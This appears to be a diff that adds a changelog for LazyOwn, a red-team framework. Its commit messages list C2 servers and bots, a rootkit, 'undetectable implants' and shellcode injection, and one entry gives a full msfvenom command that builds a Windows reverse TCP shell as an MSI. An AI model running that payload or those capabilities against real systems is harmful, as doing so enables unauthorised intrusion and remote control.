+  *   * feat(feat): new system of plugins and addons \n\n Version: release/0.2.32 \n\n  \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Apr 28 09:50:20 2025 -0400 \n\n Hora: 1745848220
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * new system plugins and addons and more
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new plugin system and addons system \n\n Version: release/0.2.31 \n\n to extend without touch the code \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Apr 28 09:40:58 2025 -0400 \n\n Hora: 1745847658
+
+
+### Otros
+
+### Otros
+
+  *   * new system plugins and addons
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new ideas \n\n Version: release/0.2.30 \n\n with love to the comunity \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Apr 17 23:06:38 2025 -0400 \n\n Hora: 1744945598
+
+
+### Otros
+
+### Otros
+
+  *   * bug on readme...
+
+
+### Otros
+
+### Otros
+
+  *   * some new ideas
+
+
+### Otros
+
+### Otros
+
+  *   * some things
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new version, new bots, new c2, new ai \n\n Version: release/0.2.29 \n\n new look and feel \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Feb 8 16:18:13 2025 -0300 \n\n Hora: 1739042293
+
+
+### Otros
+
+### Otros
+
+  *   * LazyOwn RedTeam Framework: Command & Control, Reimagined. Now with Telegram & Discord C2 Bots.
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new fetures \n\n Version: release/0.2.28 \n\n new telegram bot, new features in c2, some fixes in framework, hot fixes, and new commands in commands.md \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Jan 28 21:58:15 2025 -0300 \n\n Hora: 1738112295
+
+
+### Otros
+
+### Otros
+
+  *   * hotfix
+
+
+### Otros
+
+### Otros
+
+  *   * hotfix
+
+
+### Otros
+
+### Otros
+
+  *   * hotfix
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #82 from grisuno/grisuno-patch-3
+
+
+### Otros
+
+### Otros
+
+  *   * Create FUNDING.yml
+
+
+### Otros
+
+### Otros
+
+  *   * telegram bot
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(hotfix): hotfix \n\n Version: release/0.2.27 \n\n vulnerability \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Jan 17 19:17:20 2025 -0300 \n\n Hora: 1737152240
+
+
+### Otros
+
+### Otros
+
+  *   * hotfix
+
+
+### Otros
+
+### Otros
+
+  *   * hotfix
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new C2 world class powered by AI \n\n Version: release/0.2.26 \n\n the only o ne with AI and undetectable implants multiplatform \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Jan 17 17:34:59 2025 -0300 \n\n Hora: 1737146099
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #79 from grisuno/dev7
+
+
+### Otros
+
+### Otros
+
+  *   * new C2 con todas las características...
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new commands documented at COMMANDS.md, new rootkit named LazyHyde, new malware, nad much much more \n\n Version: release/0.2.25 \n\n demo here: https://www.youtube.com/watch?v=SZuJ4Iu1HgU \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html - docs/index.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Dec 22 19:31:07 2024 -0800 \n\n Hora: 1734924667
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #77 from grisuno/dev6
+
+
+### Otros
+
+### Otros
+
+  *   * new ring 3 rootkit, 3 new listeners go python and c, infect pid with shellcode, new style of c2, download_c2 and upload_c2 and much much more
+
+
+### Otros
+
+### Otros
+
+  *   * new ring 3 rootkit, 3 new listeners go python and c, infect pid with shellcode, new style of c2, download_c2 and upload_c2 and much much more
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(hot fix): path \n\n Version: release/0.2.24 \n\n atomic redteam framework \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Dec 15 19:01:56 2024 -0800 \n\n Hora: 1734318116
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #75 from grisuno/dev5
+
+
+### Otros
+
+### Otros
+
+  *   * some utils 9 jajaja?
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new release \n\n Version: release/0.2.23 \n\n  \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Dec 14 20:28:24 2024 -0800 \n\n Hora: 1734236904
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #73 from grisuno/dev4
+
+
+### Otros
+
+### Otros
+
+  *   * some utils 8 jajaja?
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new commands documented at commands.md \n\n Version: release/0.2.22 \n\n  \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Dec 6 17:55:30 2024 -0800 \n\n Hora: 1733536530
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #71 from grisuno/dev2
+
+
+### Otros
+
+### Otros
+
+  *   * some utils 7 jajaja?
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): new commands \n\n Version: release/0.2.21 \n\n documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Nov 25 03:44:58 2024 -0300 \n\n Hora: 1732517098
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #69 from grisuno/dev
+
+
+### Otros
+
+### Otros
+
+  *   * some utils 6 jajaja?
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new feats \n\n Version: release/0.2.20 \n\n documented at COMMANDS.md \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Nov 20 22:44:11 2024 -0300 \n\n Hora: 1732153451
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #67 from grisuno/dev
+
+
+### Otros
+
+### Otros
+
+  *   * some utils 5 jajaja?
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new feats documented at COMMANDS.md \n\n Version: release/0.2.19 \n\n :D \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Nov 18 08:15:15 2024 -0300 \n\n Hora: 1731928515
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #66 from grisuno/dev
+
+
+### Otros
+
+### Otros
+
+  *   * some utils 4 jajaja?
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new commands documented at COMMANDS.md \n\n Version: release/0.2.18 \n\n please subscribe xd \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Nov 17 03:12:38 2024 -0300 \n\n Hora: 1731823958
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #64 from grisuno/dev
+
+
+### Otros
+
+### Otros
+
+  *   * some utils 3 jajaja
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(hotfix): add option 20 of lazymsfvenom module \n\n Version: release/0.2.17 \n\n f'msfvenom -p windows/x64/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f msi > sessions/shell64.msi' \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Nov 11 22:58:46 2024 -0300 \n\n Hora: 1731376726
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): new features \n\n Version: release/0.2.16 \n\n dicumented at COMMANDS.md \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Nov 11 22:56:13 2024 -0300 \n\n Hora: 1731376573
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #62 from grisuno/dev
+
+
+### Otros
+
+### Otros
+
+  *   * some utils 2
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #61 from grisuno/dev
+
+
+### Otros
+
+### Otros
+
+  *   * some utils
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): mani commands new \n\n Version: release/0.2.15 \n\n documented at COMMANDS.md \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Nov 8 01:42:03 2024 -0300 \n\n Hora: 1731040923
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #59 from grisuno/feature/Certified
+
+
+### Otros
+
+### Otros
+
+  *   * too many commands documented at COMMANDS.md
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new tag \n\n Version: release/0.2.14 \n\n  \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Nov 3 22:23:24 2024 -0300 \n\n Hora: 1730683404
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #57 from grisuno/feature/Hackback
+
+
+### Otros
+
+### Otros
+
+  *   * too many commands documented at COMMANDS.md
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(fix):  \n\n Version: release/0.2.13 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Nov 1 17:37:22 2024 -0300 \n\n Hora: 1730493442
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test):  \n\n Version: release/0.2.13 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Nov 1 17:16:24 2024 -0300 \n\n Hora: 1730492184
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test):  \n\n Version: release/0.2.13 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Nov 1 02:39:52 2024 -0300 \n\n Hora: 1730439592
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat():  \n\n Version: release/0.2.13 \n\n  \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Nov 1 02:35:38 2024 -0300 \n\n Hora: 1730439338
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #54 from grisuno/feature/jira-3
+
+
+### Otros
+
+### Otros
+
+  *   * too many commands documented at COMMANDS.md
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #53 from grisuno/feature/jira-2
+
+
+### Otros
+
+### Otros
+
+  *   * feat History enabled, multiline commands and startup script
+
+
+### Otros
+
+### Otros
+
+  *   * second
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #51 from grisuno/feature/1
+
+
+### Otros
+
+### Otros
+
+  *   * first
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(hotfix): hotfix \n\n Version: vvvrelease/0.2.11 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Oct 30 20:07:32 2024 -0300 \n\n Hora: 1730329652
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): please subscribe :P \n\n Version: vvvrelease/0.2.10 \n\n ahahah \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Oct 30 01:15:27 2024 -0300 \n\n Hora: 1730261727
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(tes): t \n\n Version: vvvrelease/0.2.9 \n\n test \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - lazyown - payload.json - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Oct 30 00:03:05 2024 -0300 \n\n Hora: 1730257385
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): feat \n\n Version: vvvrelease/0.2.9 \n\n feat \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 28 20:25:27 2024 -0300 \n\n Hora: 1730157927
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): some bugs xD \n\n Version: vvvrelease/0.2.8 \n\n  \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - run\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 28 20:14:42 2024 -0300 \n\n Hora: 1730157282
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): test \n\n Version: vvvrelease/0.2.7 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - run\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 28 17:26:08 2024 -0300 \n\n Hora: 1730147168
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test):  \n\n Version: vvvrelease/0.2.7 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 28 17:22:02 2024 -0300 \n\n Hora: 1730146922
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test):  \n\n Version: vvvrelease/0.2.7 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 28 17:13:29 2024 -0300 \n\n Hora: 1730146409
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test):  \n\n Version: vvvrelease/0.2.7 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 28 17:09:07 2024 -0300 \n\n Hora: 1730146147
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): test \n\n Version: vvvrelease/0.2.7 \n\n test \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Oct 27 16:01:42 2024 -0300 \n\n Hora: 1730055702
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new commands https://www.youtube.com/@KillerMonkyRecordz \n\n Version: vvvrelease/0.2.7 \n\n name_the_hash, refill_password docummented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - banner.py - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - sessions/users.txt - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 26 02:29:42 2024 -0300 \n\n Hora: 1729920582
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): rpcmap_py, serveralive2, john2zip, createusers_and_hashs, pykerbrute, reg_py \n\n Version: vvvrelease/0.2.6 \n\n All documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - payload.json - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Oct 24 02:01:08 2024 -0300 \n\n Hora: 1729746068
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(fix): fix \n\n Version: vvvrelease/0.2.5 \n\n fix \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Oct 24 01:59:38 2024 -0300 \n\n Hora: 1729745978
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): test \n\n Version: vvvrelease/0.2.4 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Oct 24 01:58:37 2024 -0300 \n\n Hora: 1729745917
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor): refactor and new features \n\n Version: vvvrelease/0.2.4 \n\n hex_to_plaintext, upload_bypass, stormbreaker \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/lazyseo.py - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Oct 23 01:51:19 2024 -0300 \n\n Hora: 1729659079
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): samdump2 \n\n Version: vvvrelease/0.2.4 \n\n new command docummented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 22 22:52:13 2024 -0300 \n\n Hora: 1729648333
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): cubespraying & magicrecon \n\n Version: vvvrelease/0.2.3 \n\n all documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/win/enablewebpowershell.bat - sessions/win/enablewebpowershell.ps1 - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 22 00:53:07 2024 -0300 \n\n Hora: 1729569187
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): shellcode2sylk \n\n Version: vvvrelease/0.2.2 \n\n and little fix in venom \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 23:54:22 2024 -0300 \n\n Hora: 1729565662
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor): new payloads in winbase64payloads \n\n Version: vvvrelease/0.2.1 \n\n with love to sec communy of LazyOwn \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 23:07:12 2024 -0300 \n\n Hora: 1729562832
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): add cmd2 to install.sh \n\n Version: vvvrelease/0.2.1 \n\n bug fixing \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak - install.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:58:59 2024 -0300 \n\n Hora: 1729562339
+
+
+### Nuevo parche
+
+### Otros
+
+  *   * patch(t): t \n\n Version: vvvrelease/0.2.0 \n\n t \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:58:32 2024 -0300 \n\n Hora: 1729562312
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(t): t \n\n Version: vvvrelease/0.1.2 \n\n t \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:56:31 2024 -0300 \n\n Hora: 1729562191
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(tes): tes \n\n Version: patch..1 \n\n tes \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:55:30 2024 -0300 \n\n Hora: 1729562130
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(t): t \n\n Version: patch..1 \n\n t \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:54:49 2024 -0300 \n\n Hora: 1729562089
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(t): t \n\n Version: vvvrelease/0.1.1 \n\n t \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:52:52 2024 -0300 \n\n Hora: 1729561972
+
+
+### Nuevo Release
+
+### Otros
+
+  *   * release(tes): tes \n\n Version: vvvrelease/0.0.0 \n\n tes \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:51:56 2024 -0300 \n\n Hora: 1729561916
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(test): test \n\n Version: patch..1 \n\n test \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:47:28 2024 -0300 \n\n Hora: 1729561648
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(test): test \n\n Version:  \n\n test \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:33:51 2024 -0300 \n\n Hora: 1729560831
+
+
+### Nuevo parche
+
+### Otros
+
+  *   * patch(test): test \n\n Version: vvvrelease/0.1.0 \n\n test \n\n Modified file(s):\n- CHANGELOG.md - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:25:26 2024 -0300 \n\n Hora: 1729560326
+
+
+### Nuevo Release
+
+### Otros
+
